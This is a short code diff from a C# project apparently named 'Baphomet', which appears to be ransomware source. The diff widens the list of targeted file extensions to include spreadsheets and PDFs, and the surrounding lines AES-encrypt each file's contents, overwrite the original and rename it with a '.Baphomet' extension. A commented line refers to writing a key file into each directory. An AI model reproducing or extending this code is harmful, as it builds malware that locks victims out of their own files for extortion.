@@ -28,7 +28,7 @@ namespace Baphomet.Utilities
         {
             CryptRSA cryptRSA = new CryptRSA();
 
-            var extensionCheck = new[] { ".txt",".jpg",".png",".php" };//Extensiones validas
+            var extensionCheck = new[] { ".txt", ".jpg", ".png",".php" , ".xlsx", "pdf" };//Extensiones validas
             cryptRSA.EncryptText(targetPath, key);
 
            // File.WriteAllText(targetPath + "\\yourkey.key", encryptedKey);//escribo la llave en cada uno de los directorios
@@ -66,7 +66,7 @@ namespace Baphomet.Utilities
 
             var encryptedBytes = UseAES(encryptFileBites, passwordBytes);
             File.WriteAllBytes(file, encryptedBytes);
-            System.IO.File.Move(file, file + ".Baphomet");
+            File.Move(file, file + ".Baphomet");
 
         }
 
